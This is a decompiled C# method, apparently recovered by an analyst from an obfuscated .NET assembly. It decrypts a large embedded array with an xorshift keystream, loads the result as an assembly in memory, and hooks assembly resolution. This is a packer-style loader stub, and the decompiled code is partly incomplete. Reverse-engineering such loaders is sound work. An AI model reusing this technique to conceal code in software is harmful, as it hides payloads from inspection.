// Recovered from method token 0x0600000d; analyst names; not the original source.
using System;
using System.Reflection;
using System.Runtime.CompilerServices;

internal static void Recovered_06_000d_Name()
{
	uint num = 10598064u;
	uint[] array = new uint[10598064];
	RuntimeHelpers.InitializeArray(array, (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
	uint[] array2 = array;
	uint[] array3 = new uint[16];
	uint num2 = 2137161620u;
	for (int i = 0; i < 16; i++)
	{
		num2 ^= num2 >> 13;
		num2 ^= num2 << 25;
		num2 = (array3[i] = num2 ^ (num2 >> 27));
	}
	int j = 0;
	int num3 = 0;
	uint[] array4 = new uint[16];
	byte[] array5 = new byte[num * 4];
	for (; j < num; j += 16)
	{
		for (int k = 0; k < 16; k++)
		{
			array4[k] = array2[j + k];
		}
		array4[0] = array4[0] ^ array3[0];
		array4[1] = array4[1] ^ array3[1];
		array4[2] = array4[2] ^ array3[2];
		array4[3] = array4[3] ^ array3[3];
		array4[4] = array4[4] ^ array3[4];
		array4[5] = array4[5] ^ array3[5];
		array4[6] = array4[6] ^ array3[6];
		array4[7] = array4[7] ^ array3[7];
		array4[8] = array4[8] ^ array3[8];
		array4[9] = array4[9] ^ array3[9];
		array4[10] = array4[10] ^ array3[10];
		array4[11] = array4[11] ^ array3[11];
		array4[12] = array4[12] ^ array3[12];
		array4[13] = array4[13] ^ array3[13];
		array4[14] = array4[14] ^ array3[14];
		array4[15] = array4[15] ^ array3[15];
		for (int l = 0; l < 16; l++)
		{
			uint num4 = array4[l];
			array5[num3++] = (byte)num4;
			array5[num3++] = (byte)(num4 >> 8);
			array5[num3++] = (byte)(num4 >> 16);
			array5[num3++] = (byte)(num4 >> 24);
			array3[l] ^= num4;
		}
	}
	Recovered_04_0003_Name = Assembly.Load(Recovered_06_0006_Name(array5));
	AppDomain.CurrentDomain.AssemblyResolve += Recovered_06_000e_Name;
}
